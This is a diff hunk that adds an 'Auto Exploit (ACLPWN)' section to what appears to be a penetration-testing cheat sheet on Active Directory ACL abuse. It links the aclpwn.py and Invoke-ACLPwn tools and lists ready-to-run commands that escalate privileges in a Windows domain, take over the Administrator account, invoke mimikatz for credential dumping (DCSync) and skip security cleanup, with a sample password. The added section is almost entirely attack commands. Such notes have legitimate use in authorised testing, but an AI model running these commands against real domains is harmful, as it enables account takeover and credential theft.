@@ -119,6 +119,31 @@ mount <target>:/home/xx /mnt/yy
 
 ## **ACLs**
 
+### Auto Exploit (ACLPWN)
+
+https://github.com/fox-it/aclpwn.py
+https://github.com/fox-it/Invoke-ACLPwn
+
+
+```bash
+# pip install aclpwn
+python aclpwn.py -f <username> -ft user -d <domain> -dry
+python aclpwn.py -f <computer_name> -ft computer -d <domain> -dry
+python aclpwn.py -f <username> -ft user -d <domain>
+python aclpwn.py -f <username> -ft user -d <domain>--restore aclpwn-20181129-182321.restore
+
+# Powershell
+./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -NoDCSync
+./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe
+./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -userAccountToPwn 'Administrator'
+./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -LogToFile
+./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -NoSecCleanup
+./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'testuser' -Domain 'xenoflux.local' -Password 'Welcome01!'
+```
+
+
+### Manual Exploit DCSync
+
 Get ACL
 
 ```bash
